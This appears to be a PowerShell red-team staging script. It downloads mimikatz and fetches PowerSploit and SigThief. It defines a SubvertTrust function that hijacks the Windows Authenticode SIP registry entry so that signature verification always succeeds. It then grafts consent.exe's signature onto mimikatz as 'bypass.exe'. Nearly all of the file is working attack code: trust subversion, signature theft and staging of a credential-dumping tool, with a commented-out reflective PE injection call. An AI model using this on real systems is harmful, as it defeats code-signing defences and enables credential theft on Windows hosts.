choco install unzip -y

$wpath = 'C:\Tools'
$desktop = 'C:\Users\$env:username\Desktop\'
cd $wpath
###############
# Reflective PE
###############

# mimikatz binary
(new-object net.webclient).downloadfile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20170813/mimikatz_trunk.zip", "$wpath\mimikatz_trunk.zip")
unzip $wpath\mimikatz_trunk.zip -d $wpath\mimikatz
# cp $wpath\mimikatz\Win32\mimikatz.exe $wpath\
cp $wpath\mimikatz\x64\mimikatz.exe $desktop
mv $wpath\mimikatz_trunk.zip $wpath\extra\

# powersploit
git clone https://github.com/PowerShellMafia/PowerSploit.git
Import-Module PowerSploit\PowerSploit.psd1

# $Bytes = [IO.File]::ReadAllBytes("c:\users\cpillar\desktop\mimikatz.exe")
# Invoke-ReflectivePEInjection -PEBytes $Bytes


##########################
# Borrow Digital Signature
##########################


# SigThief
git clone https://github.com/secretsquirrel/SigThief.git

<#
    SubvertTrust v1.0
    License: GPLv3
    Author: @ConsciousHacker
    Credits: @mattifestation
#>

function SubvertTrust
{
        $VerifyHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllVerifyIndirectData'

        # PE SIP Guids
        #{C689AAB9-8E78-11D0-8C47-00C04FC295EE}
        #{C689AABA-8E78-11D0-8C47-00C04FC295EE}
        $PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'

        $PESignatureVerifier = Get-Item -Path "$VerifyHashFunc\$PESIPGuid\"

        # Signed code reuse attack that will effectively return TRUE when the
        # digitial signature hash validation function is called.
        $NewDll = 'C:\Windows\System32\ntdll.dll'
        $NewFuncName = 'DbgUiContinue'

        $PESignatureVerifier | Set-ItemProperty -Name Dll -Value $NewDll
        $PESignatureVerifier | Set-ItemProperty -Name FuncName -Value $NewFuncName
}

function RevertTrust
{
        $VerifyHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllVerifyIndirectData'

        # PE SIP Guids
        #{C689AAB9-8E78-11D0-8C47-00C04FC295EE}
        #{C689AABA-8E78-11D0-8C47-00C04FC295EE}
        $PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'

        $PESignatureVerifier = Get-Item -Path "$VerifyHashFunc\$PESIPGuid\"

        # Signed code reuse attack that will effectively return TRUE when the
        # digitial signature hash validation function is called.
        $NewDll = 'WINTRUST.DLL'
        $NewFuncName = 'CryptSIPVerifyIndirectData'

        $PESignatureVerifier | Set-ItemProperty -Name Dll -Value $NewDll
        $PESignatureVerifier | Set-ItemProperty -Name FuncName -Value $NewFuncName
}

cd $desktop
python $wpath\SigThief\sigthief.py -i C:\Windows\System32\consent.exe -t $desktop\mimikatz.exe -o $desktop\bypass.exe
SubvertTrust
Get-AuthenticodeSignature -FilePath C:\Users\cpillar\Desktop\bypass.exe

# Start a new process
# PowerShell
